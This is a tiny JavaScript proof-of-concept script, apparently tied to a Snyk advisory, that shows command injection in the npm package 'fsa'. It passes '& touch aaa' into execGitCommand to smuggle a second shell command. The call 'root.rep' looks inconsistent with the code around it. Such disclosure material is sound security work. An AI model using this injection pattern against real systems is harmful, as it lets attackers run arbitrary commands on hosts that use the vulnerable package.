//https://snyk.io/vuln/SNYK-JS-FSA-564118
var root = require("fsa");
var attack_code = "& touch aaa";
var dir = "./";
var options = {};
rep = "./";
root.rep.execGitCommand(attack_code, dir, options, function () {});
